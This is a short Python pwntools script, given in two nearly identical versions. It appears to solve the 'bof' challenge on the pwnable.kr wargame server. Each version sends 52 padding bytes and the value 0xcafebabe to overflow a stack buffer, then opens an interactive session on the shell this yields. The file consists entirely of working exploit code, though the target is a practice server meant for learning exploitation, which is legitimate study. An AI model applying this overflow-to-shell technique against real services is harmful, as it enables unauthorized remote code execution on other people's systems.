from pwn import *

r = remote('pwnable.kr', 9000)

payload = b'A'*52
payload += p32(0xcafebabe)

r.send(payload)
r.interactive()

#######################################

from pwn import *

r = remote('pwnable.kr', 9000)

payload = b'A'*52
payload += b'\xbe\xba\xfe\xca'

r.send(payload)
r.interactive()
